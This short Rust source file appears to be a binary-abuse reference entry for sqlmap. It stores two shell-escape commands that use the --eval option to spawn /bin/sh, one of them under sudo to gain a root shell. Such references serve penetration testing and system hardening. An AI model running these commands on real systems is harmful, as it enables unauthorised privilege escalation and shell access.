pub static BIN_NAME: &'static str = "sqlmap";
pub static BIN_DESC: &'static str =
    "This allows to execute `python` code, other functions may apply.";
pub static SH_CODE: &'static str = r#"
    
    sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
